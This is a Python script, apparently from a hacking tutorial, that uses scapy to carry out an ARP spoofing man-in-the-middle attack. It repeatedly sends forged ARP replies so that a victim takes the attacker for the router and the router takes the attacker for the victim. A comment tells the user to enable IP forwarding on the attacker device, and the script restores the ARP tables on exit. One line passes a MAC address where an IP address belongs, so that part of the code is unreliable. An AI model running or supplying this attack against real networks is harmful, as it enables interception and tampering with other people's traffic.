#to forward packets from attacker device 
#use the command "echo 1 > /proc/sys/net/ipv4/ip_forward"

#!/usr/bin/env python

from tabnanny import verbose
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

#This is used to change IP address in the table of the victim and router
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_mac, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)#Send it 4 times, just to make sure the target machine fixes the ip

target_ip = ""
gateway_ip = ""

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)#This will send packet to victim with spoofed IP of router, thus victim will think I am the router
        spoof(gateway_ip, target_ip)#This will send packet to router with spoofed IP of victim, thus router will think I am the victim
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent " + str(sent_packets_count), end="")#\r is used to print by replacing the previous print and not print a new statement, the end="" is used to have it print on the same line
        time.sleep(2)#To not overload the devices, send packets after every 2s
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Resetting ARP Table .......... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)